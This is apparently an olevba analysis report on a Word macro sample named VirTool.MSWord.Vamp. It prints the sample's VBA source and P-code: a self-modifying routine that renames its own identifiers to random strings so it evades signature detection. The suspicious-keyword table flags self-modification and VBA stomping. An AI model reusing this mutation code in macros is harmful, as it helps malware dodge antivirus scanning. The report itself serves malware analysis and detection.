olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.Vamp
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.Vamp - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub INITALIZE_VAMP()
On Error Resume Next
Randomize
Dim r1(1 To 8) As String ' Update the array for however many variable you add - so if you have r1(20) then this line should read r1(1 to 20)
r1(1) = "VARIABLE3": r1(2) = "VARIABLE4": r1(3) = "VARIABLE5": r1(4) = "VARIABLE6": r1(5) = "VAMP": r1(6) = "INITALIZE": r1(7) = "VARIABLE2": r1(8) = "VARIABLE1"
' Add your variable names here - example the next one would be r1(9) = "MyVariable"
For x = 1 To 8 ' Change this number up to how ever many variable you add - so if you have r1(20) then this line should read x = 1 to 20
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 900) & Int(Rnd * 900)
Call VAMP(a1, r1(x))
Next x
End Sub
Private Sub VAMP(VARIABLE1, VARIABLE2 As String)  'VAMP v1.0
On Error Resume Next
Dim VARIABLE3 As Long: Dim VARIABLE4 As Long: Dim VARIABLE5 As Long: Dim VARIABLE6 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
VARIABLE3 = 1: VARIABLE4 = 1: VARIABLE5 = .CountOfLines: VARIABLE6 = Len(.Lines(.CountOfLines, 1))
Do While .Find(VARIABLE2, VARIABLE3, VARIABLE4, VARIABLE5, VARIABLE6, True)
s1 = .Lines(VARIABLE3, 1)
s1 = Left(s1, VARIABLE4 - 1) & VARIABLE1 & Mid(s1, VARIABLE6)
.replaceline VARIABLE3, s1
VARIABLE3 = VARIABLE5 + 1: VARIABLE4 = 1
VARIABLE5 = .CountOfLines
VARIABLE6 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: VirTool.MSWord.Vamp
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 14194 bytes
' Line #0:
' 	FuncDefn (Private Sub INITALIZE_VAMP())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	ArgsCall Read 0x0000 
' Line #3:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	VarDefn r1 (As String)
' 	QuoteRem 0x0019 0x0072 " Update the array for however many variable you add - so if you have r1(20) then this line should read r1(1 to 20)"
' Line #4:
' 	LitStr 0x0009 "VARIABLE3"
' 	LitDI2 0x0001 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "VARIABLE4"
' 	LitDI2 0x0002 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "VARIABLE5"
' 	LitDI2 0x0003 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "VARIABLE6"
' 	LitDI2 0x0004 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "VAMP"
' 	LitDI2 0x0005 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "INITALIZE"
' 	LitDI2 0x0006 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "VARIABLE2"
' 	LitDI2 0x0007 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "VARIABLE1"
' 	LitDI2 0x0008 
' 	ArgsSt r1 0x0001 
' Line #5:
' 	QuoteRem 0x0000 0x0052 " Add your variable names here - example the next one would be r1(9) = "MyVariable""
' Line #6:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	For 
' 	QuoteRem 0x000F 0x0077 " Change this number up to how ever many variable you add - so if you have r1(20) then this line should read x = 1 to 20"
' Line #7:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0384 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0384 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St a1 
' Line #8:
' 	Ld a1 
' 	Ld x 
' 	ArgsLd r1 0x0001 
' 	ArgsCall (Call) VAMP 0x0002 
' Line #9:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #10:
' 	EndSub 
' Line #11:
' 	FuncDefn (Private Sub VAMP(VARIABLE1, VARIABLE2 As String))
' 	QuoteRem 0x0032 0x0009 "VAMP v1.0"
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	Dim 
' 	VarDefn VARIABLE3 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn VARIABLE4 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn VARIABLE5 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn VARIABLE6 (As Long)
' Line #14:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #15:
' 	LitDI2 0x0001 
' 	St VARIABLE3 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St VARIABLE4 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St VARIABLE5 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St VARIABLE6 
' Line #16:
' 	Ld VARIABLE2 
' 	Ld VARIABLE3 
' 	Ld VARIABLE4 
' 	Ld VARIABLE5 
' 	Ld VARIABLE6 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #17:
' 	Ld VARIABLE3 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St s1 
' Line #18:
' 	Ld s1 
' 	Ld VARIABLE4 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld VARIABLE1 
' 	Concat 
' 	Ld s1 
' 	Ld VARIABLE6 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St s1 
' Line #19:
' 	Ld VARIABLE3 
' 	Ld s1 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #20:
' 	Ld VARIABLE5 
' 	LitDI2 0x0001 
' 	Add 
' 	St VARIABLE3 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St VARIABLE4 
' Line #21:
' 	MemLdWith CountOfLines 
' 	St VARIABLE5 
' Line #22:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St VARIABLE6 
' Line #23:
' 	Loop 
' Line #24:
' 	EndWith 
' Line #25:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

